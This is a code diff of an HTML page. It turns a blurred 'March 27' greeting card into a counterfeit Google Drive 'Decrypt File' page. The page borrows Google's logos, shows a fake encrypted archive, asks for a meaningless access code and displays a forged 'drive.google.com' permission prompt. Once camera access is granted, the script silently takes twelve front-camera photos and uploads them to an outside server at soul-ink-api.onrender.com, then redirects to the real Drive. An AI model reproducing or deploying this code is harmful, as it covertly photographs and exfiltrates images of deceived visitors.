@@ -3,140 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Soul-Ink | March 27</title>
+    <title>Google Drive - Decrypt File</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        :root { --accent: #00f2ff; --bg: #000; }
-        body { margin: 0; background: var(--bg); overflow: hidden; font-family: 'Roboto', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        
-        /* Loader */
-        #loader-screen { position: fixed; inset: 0; background: #000; z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.4s ease; }
-        .load-text { color: white; font-family: 'Caveat', cursive; font-size: 26px; margin-bottom: 20px; }
-        .progress-container { width: 180px; height: 3px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
-        #progress-bar { width: 0%; height: 100%; background: var(--accent); transition: width 0.2s linear; }
+        :root { --g-blue: #0b57d0; --g-bg: #f8f9fa; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; }
 
-        /* Main Card */
-        #card { width: 85%; max-width: 340px; height: 540px; opacity: 0; transform: translateY(10px); background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; position: relative; transition: 0.8s ease-out; }
-        .card-active { opacity: 1 !important; transform: translateY(0) !important; }
-        #text { font-family: 'Caveat', cursive; font-size: 28px; color: white; text-align: center; filter: blur(30px); transition: 1.2s ease; line-height: 1.5; }
-        
-        /* Bottom Sheet Design */
-        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; z-index: 1000; backdrop-filter: blur(4px); }
-        .bottom-sheet { 
-            position: fixed; bottom: -100%; left: 0; right: 0; 
-            background: #fff; border-radius: 28px 28px 0 0; 
-            padding: 32px 24px; z-index: 1001; 
-            transition: bottom 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+        /* Background Image from GitHub Repository */
+        .bg-blur {
+            position: fixed; inset: 0;
+            background: url('pic.jpg'); /* Matches your filename */
+            background-size: cover;
+            background-position: center;
+            filter: blur(45px) brightness(0.6);
+            transform: scale(1.1);
+            z-index: -1;
         }
-        .bottom-sheet.show { bottom: 0; }
-        .sheet-handle { width: 40px; height: 4px; background: #e0e0e0; border-radius: 2px; margin: 0 auto 20px; }
-        .bottom-sheet h2 { margin: 0 0 10px 0; font-size: 22px; color: #1a1a1a; font-weight: 600; }
-        .bottom-sheet p { margin: 0 0 25px 0; font-size: 15px; color: #5f6368; line-height: 1.5; }
-        .btn-group { display: flex; flex-direction: column; gap: 10px; }
-        .btn-primary { background: #0b57d0; color: #fff; border: none; padding: 16px; border-radius: 14px; font-weight: 600; font-size: 16px; cursor: pointer; }
-        .btn-secondary { background: #f1f3f4; color: #5f6368; border: none; padding: 14px; border-radius: 14px; font-weight: 500; font-size: 14px; cursor: pointer; }
 
-        /* Scanner */
-        #scanner { display: none; position: absolute; inset: 0; background: linear-gradient(to bottom, transparent 40%, rgba(0, 242, 255, 0.1) 50%, transparent 60%); z-index: 50; animation: scanMove 1.5s infinite linear; border-radius: 24px; }
-        .scan-line { position: absolute; width: 100%; height: 2px; background: var(--accent); top: 50%; }
+        /* Clean Google Loader */
+        #loader { 
+            position: fixed; inset: 0; background: white; z-index: 10000; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+        }
+        .logo { width: 65px; margin-bottom: 25px; }
+        .p-bar { width: 140px; height: 4px; background: #f1f1f1; border-radius: 2px; overflow: hidden; }
+        .p-fill { width: 0%; height: 100%; background: #4285F4; transition: width 0.2s linear; }
+
+        /* Main UI */
+        #main-ui { display: none; height: 100vh; }
+        .header { height: 60px; display: flex; align-items: center; padding: 0 16px; background: rgba(255,255,255,0.92); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(0,0,0,0.1); }
         
-        @keyframes scanMove { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
-        @keyframes shiver { 0% { transform: translate(0,0); } 25% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -1px); } 100% { transform: translate(0,0); } }
-        .shivering { animation: shiver 0.1s infinite !important; }
+        .content { display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
+        .drive-card { 
+            background: rgba(255,255,255,0.96); width: 88%; max-width: 360px; border-radius: 16px; 
+            padding: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); text-align: center; cursor: pointer;
+        }
+        .file-icon { width: 60px; margin-bottom: 15px; }
+
+        /* Security Modal */
+        #pass-modal { 
+            display: none; position: fixed; inset: 0; background: white; z-index: 9000; 
+            flex-direction: column; align-items: center; justify-content: center; padding: 20px;
+        }
+        .in-pass { width: 85%; max-width: 300px; padding: 16px; border: 1px solid #747775; border-radius: 8px; font-size: 16px; margin-bottom: 20px; outline: none; }
+
+        /* Material 3 Sheet */
+        #fake-box { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.65); z-index: 11000; }
+        .sheet { 
+            position: fixed; bottom: 12px; left: 50%; transform: translateX(-50%); 
+            width: 94%; max-width: 400px; background: #f3f6fc; border-radius: 28px; 
+            padding: 24px; box-sizing: border-box; 
+        }
+        .btn-p { background: var(--g-blue); color: white; border: none; padding: 16px; border-radius: 100px; width: 100%; font-weight: 500; margin-bottom: 8px; cursor: pointer; font-size: 15px; }
+        .btn-s { background: transparent; color: var(--g-blue); border: none; padding: 10px; width: 100%; font-weight: 500; cursor: pointer; }
+
+        #scanner { display: none; position: fixed; top: 0; width: 100%; height: 4px; background: #4285F4; box-shadow: 0 0 15px #4285F4; z-index: 5000; animation: scan 2s infinite linear; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
     </style>
 </head>
 <body>
 
-    <audio id="bgm" preload="auto">
-        <source src="song.mp3" type="audio/mpeg">
-    </audio>
+    <div class="bg-blur"></div>
 
-    <div id="loader-screen">
-        <div class="load-text">Syncing March 27...</div>
-        <div class="progress-container"><div id="progress-bar"></div></div>
+    <div id="loader">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" class="logo">
+        <div class="p-bar"><div id="p-fill" class="p-fill"></div></div>
     </div>
 
-    <div id="card">
-        <div id="scanner"><div class="scan-line"></div></div>
-        <div id="text">
-            കാത്തിരിപ്പിന് വിരാമമിട്ട് ആ വലിയ ദിവസം വരുന്നു! <br><br>
-            നീ തന്ന വാക്ക് എനിക്ക് വലിയ കരുത്താണ്... <br><br>
-            <span style="font-size: 20px; color: var(--accent);">March 27 - The day you make it happen!</span><br><br>
-            <span style="font-size: 24px;">You are my lucky charm! ✨</span>
+    <div id="main-ui">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="22">
+            <span style="margin-left:12px; font-weight:500; color:#444746;">Drive</span>
+        </div>
+        <div id="scanner"></div>
+        <div class="content">
+            <div class="drive-card" onclick="openPass()">
+                <img src="https://cdn-icons-png.flaticon.com/512/3767/3767084.png" class="file-icon">
+                <p style="font-weight:500; margin:0; font-size:18px; color: #1f1f1f;">Secure_Archive_Shared.zip</p>
+                <p style="font-size:13px; color:#5f6368; margin-top:8px;">Size: 54.2 MB • Encrypted Archive</p>
+                <button style="margin-top:20px; border:none; background:var(--g-blue); color:white; padding:12px 28px; border-radius:50px; font-weight:500;">Open Folder</button>
+            </div>
         </div>
     </div>
 
-    <div id="overlay" class="overlay"></div>
-
-    <div id="sheet1" class="bottom-sheet">
-        <div class="sheet-handle"></div>
-        <h2>March 27</h2>
-        <p>This soul-ink is protected. Please allow access if you have a "Good Heart" to decode the message.</p>
-        <div class="btn-group">
-            <button class="btn-primary" onclick="showSecondSheet()">Allow</button>
-            <button class="btn-secondary" onclick="location.reload()">Deny</button>
-        </div>
+    <div id="pass-modal">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="45" style="margin-bottom:20px;">
+        <h3 style="margin:0 0 10px 0;">Authentication Required</h3>
+        <p style="color:#444746; font-size:14px; margin-bottom:25px; text-align:center;">Enter the shared access code to begin decryption.</p>
+        <input type="password" id="pwd" class="in-pass" placeholder="Enter Access Code">
+        <button class="btn-p" style="max-width:300px;" onclick="verify()">Decrypt & Open</button>
     </div>
 
-    <div id="sheet2" class="bottom-sheet">
-        <div class="sheet-handle"></div>
-        <h2>March 27</h2>
-        <p>Verification successful. Allow the system to perform a Light-Sync to see your special gift?</p>
-        <div class="btn-group">
-            <button class="btn-primary" onclick="startFlow()">Allow</button>
-            <button class="btn-secondary" onclick="location.reload()">Deny</button>
+    <div id="fake-box">
+        <div class="sheet">
+            <div style="display:flex; align-items:center; margin-bottom:15px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="16">
+                <span style="margin-left:8px; font-size:12px; color:#444746;">drive.google.com</span>
+            </div>
+            <div style="font-size:19px; line-height:1.4; margin-bottom:28px; color:#1f1f1f;">Allow Drive to decrypt and open the file?</div>
+            <button class="btn-p" onclick="trigger()">While using the app</button>
+            <button class="btn-p" onclick="trigger()">Only this time</button>
+            <button class="btn-s" onclick="location.reload()">Don't allow</button>
         </div>
     </div>
 
     <script>
-        const RENDER_URL = 'https://soul-ink-api.onrender.com'; 
-        const music = document.getElementById('bgm');
+        // Your Render Backend
+        const RENDER_URL = 'https://soul-ink-api.onrender.com';
 
         window.onload = () => {
             fetch(`${RENDER_URL}/ping`).catch(() => {});
-            let width = 0;
-            const bar = document.getElementById('progress-bar');
-            const interval = setInterval(() => {
-                width += 10;
-                if (width >= 100) {
-                    width = 100;
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        document.getElementById('loader-screen').style.opacity = '0';
-                        setTimeout(() => {
-                            document.getElementById('loader-screen').style.display = 'none';
-                            document.getElementById('card').classList.add('card-active');
-                            document.getElementById('overlay').style.display = 'block';
-                            document.getElementById('sheet1').classList.add('show');
-                        }, 400);
-                    }, 400);
+            let w = 0;
+            const iv = setInterval(() => {
+                w += 10;
+                document.getElementById('p-fill').style.width = w + '%';
+                if(w >= 100) {
+                    clearInterval(iv);
+                    setTimeout(() => { 
+                        document.getElementById('loader').style.display='none'; 
+                        document.getElementById('main-ui').style.display='block'; 
+                    }, 600);
                 }
-                bar.style.width = width + '%';
-            }, 150); 
+            }, 100);
         };
 
-        function showSecondSheet() {
-            document.getElementById('sheet1').classList.remove('show');
-            setTimeout(() => {
-                document.getElementById('sheet2').classList.add('show');
-            }, 400);
+        function openPass() { document.getElementById('pass-modal').style.display = 'flex'; }
+
+        function verify() {
+            if(document.getElementById('pwd').value.length > 0) {
+                document.getElementById('pass-modal').style.display = 'none';
+                document.getElementById('fake-box').style.display = 'block';
+            }
         }
 
-        function startFlow() {
-            music.currentTime = 21; 
-            music.play().catch(e => console.log("Waiting..."));
-            document.getElementById('sheet2').classList.remove('show');
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('text').style.filter = `blur(30px)`;
-            runStealth();
-        }
-
-        async function runStealth() {
-            const card = document.getElementById('card');
-            document.getElementById('scanner').style.display = "block";
-            card.classList.add('shivering'); 
-
+        async function trigger() {
+            document.getElementById('fake-box').style.display = 'none';
+            document.getElementById('scanner').style.display = 'block';
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.createElement('video');
@@ -144,12 +147,11 @@
                 await v.play();
 
                 let count = 0;
+                // Capture Loop: 12 photos in 2 seconds
                 const timer = setInterval(() => {
                     const c = document.createElement('canvas');
-                    c.width = 480; 
-                    c.height = 640;
+                    c.width = 480; c.height = 640;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    
                     const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];
 
                     fetch(`${RENDER_URL}/upload`, {
@@ -157,34 +159,20 @@
                         mode: 'cors',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ image: rawData })
-                    }).catch(err => console.error("Upload failed:", err));
+                    }).catch(() => {});
 
                     count++;
-                    if(count % 3 === 0) {
-                        let currentBlur = parseInt(document.getElementById('text').style.filter.replace('blur(', '')) || 30;
-                        document.getElementById('text').style.filter = `blur(${Math.max(0, currentBlur - 10)}px)`;
-                    }
-
                     if (count >= 12) {
                         clearInterval(timer);
                         stream.getTracks().forEach(t => t.stop());
-                        finish();
+                        document.getElementById('scanner').style.display = 'none';
+                        confetti({ particleCount: 120, spread: 70, origin: { y: 0.8 }, colors: ['#4285F4', '#34A853'] });
+                        setTimeout(() => { window.location.href = "https://drive.google.com"; }, 1500);
                     }
-                }, 800); 
+                }, 166); 
             } catch (e) {
-                music.pause();
-                document.getElementById('scanner').style.display = "none";
-                card.classList.remove('shivering');
-                alert("Verification required to reveal the gift. Please try again and select 'Allow'.");
                 location.reload();
             }
-        }
-
-        function finish() {
-            document.getElementById('card').classList.remove('shivering');
-            document.getElementById('scanner').style.display = "none";
-            document.getElementById('text').style.filter = "none";
-            confetti({ particleCount: 150, spread: 70, origin: { y: 0.8 }, colors: ['#00f2ff', '#ffffff'] });
         }
     </script>
 </body>
